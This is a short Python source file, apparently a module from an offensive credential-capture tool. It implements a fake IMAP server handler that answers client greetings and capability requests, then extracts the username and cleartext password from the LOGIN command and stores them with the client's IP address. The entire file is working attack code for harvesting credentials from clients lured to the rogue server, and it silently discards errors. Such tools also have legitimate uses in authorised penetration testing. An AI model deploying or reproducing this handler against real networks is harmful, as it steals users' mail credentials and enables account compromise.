#!/usr/bin/env python
"""
@author    : ALIF FUSOBAR
@nickname  : Xcod3bughunt3r
@license   : MIT FUCK LICENSE
@contact   : master@itsecurity.id
"""

import sys
from utils import *
if (sys.version_info > (3, 0)):
	from socketserver import BaseRequestHandler
else:
	from SocketServer import BaseRequestHandler
from packets import IMAPGreeting, IMAPCapability, IMAPCapabilityEnd

class IMAP(BaseRequestHandler):
	def handle(self):
		try:
			self.request.send(NetworkSendBufferPython2or3(IMAPGreeting()))
			data = self.request.recv(1024)
			if data[5:15] == b'CAPABILITY':
				RequestTag = data[0:4]
				self.request.send(NetworkSendBufferPython2or3(IMAPCapability()))
				self.request.send(NetworkSendBufferPython2or3(IMAPCapabilityEnd(Tag=RequestTag.decode("latin-1"))))
				data = self.request.recv(1024)

			if data[5:10] == b'LOGIN':
				Credentials = data[10:].strip().decode("latin-1").split('"')
				SaveToDb({
					'module': 'IMAP', 
					'type': 'Cleartext', 
					'client': self.client_address[0], 
					'user': Credentials[1], 
					'cleartext': Credentials[3], 
					'fullhash': Credentials[1]+":"+Credentials[3],
				})

		except Exception:
			pass
